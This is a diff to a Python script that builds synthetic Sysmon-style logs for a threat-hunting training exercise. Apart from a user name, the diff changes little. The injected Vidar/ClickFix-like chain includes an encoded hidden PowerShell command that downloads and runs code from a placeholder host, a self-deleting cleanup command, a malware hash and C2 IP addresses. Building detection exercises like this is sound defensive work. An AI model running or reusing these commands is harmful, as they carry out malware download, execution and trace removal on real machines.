@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+﻿#!/usr/bin/env python3
 """Generate SIMULATED Sysmon-style telemetry (ECS-like field names) for the Week 5 hunt.
 Benign background noise + a small injected Vidar/ClickFix-like chain.
 All data is synthetic - no real malware is used or executed."""
@@ -16,7 +16,7 @@ os.makedirs(os.path.dirname(args.out), exist_ok=True)
 
 START = datetime(2026, 10, 5, 8, 0, 0)
 HOSTS = [f"WS-{i:02d}" for i in range(1, 9)]
-USERS = ["aigerim", "daulet", "madina", "ruslan", "admin.it"]
+USERS = ["aigerim", "daulet", "user03", "ruslan", "admin.it"]
 SHA_VIDAR = "e93511363f7781c4c7ff3ed0698db6c4634092fe7e93ca96d666509a9412e73e"  # from Week 2 (MalwareBazaar)
 C2_IP = "195.201.250.209"   # high-confidence c2_ip from our dataset (31.59.44.104 is only a low-confidence candidate)
 CAND_IP = "31.59.44.104"    # Week 2 Shodan candidate (to_ids=False)
@@ -64,9 +64,9 @@ for _ in range(args.benign):
     else:
         events.append(net(h, u, random.choice(["chrome.exe", "msedge.exe"]), f"142.250.{random.randint(1,254)}.{random.randint(1,254)}", 443, m))
 
-# Injected attack chain on WS-04 (user 'madina'), ClickFix-like: Run dialog -> PowerShell -> payload in %TEMP% -> DDR -> C2
-h, u, t0 = "WS-04", "madina", 300
-payload = r"C:\Users\madina\AppData\Local\Temp\lf3t32pa.exe"
+# Injected attack chain on WS-04 (user 'user03'), ClickFix-like: Run dialog -> PowerShell -> payload in %TEMP% -> DDR -> C2
+h, u, t0 = "WS-04", "user03", 300
+payload = r"C:\Users\user03\AppData\Local\Temp\lf3t32pa.exe"
 events += [
     proc(1, h, u, "powershell.exe",
          "powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcAApAA==",
@@ -80,7 +80,7 @@ events += [
     dns(h, u, "lf3t32pa.exe", "steamcommunity.com", t0 + 3),
     net(h, u, "lf3t32pa.exe", CAND_IP, 80, t0 + 4),
     net(h, u, "lf3t32pa.exe", C2_IP, 443, t0 + 5),
-    proc(1, h, u, "cmd.exe", r'cmd.exe /c timeout /t 5 & del "C:\Users\madina\AppData\Local\Temp\lf3t32pa.exe"', "lf3t32pa.exe", minutes=t0 + 6),
+    proc(1, h, u, "cmd.exe", r'cmd.exe /c timeout /t 5 & del "C:\Users\user03\AppData\Local\Temp\lf3t32pa.exe"', "lf3t32pa.exe", minutes=t0 + 6),
 ]
 # A benign admin encoded-command (false positive to discuss in tuning)
 events.append(proc(1, "WS-02", "admin.it", "powershell.exe",
